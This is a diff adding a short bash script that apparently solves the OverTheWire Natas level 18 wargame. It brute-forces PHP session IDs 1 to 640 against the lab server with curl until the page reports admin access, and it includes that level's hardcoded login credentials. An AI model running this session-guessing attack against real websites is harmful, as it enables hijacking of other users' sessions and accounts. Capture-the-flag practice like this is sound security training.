@@ -1,0 +1,25 @@
+#!/bin/bash
+
+main() 
+{
+ 	for i in $(seq 1 640); do
+		r=$(check $i)
+		echo -en "session $i..." "\r"
+		if [ "$r" = "yes" ]; then
+			echo "$r. Your session id: $i"
+			break
+		fi
+	done;
+}
+
+check()
+{
+	result=$(curl --user natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org --cookie "PHPSESSID=$1" 2>&1 | grep "You are an admin" | cut -d . -f1)
+	
+	if [ "$result" = "You are an admin" ]; then
+		echo "yes"
+	fi
+}
+
+check 1
+main
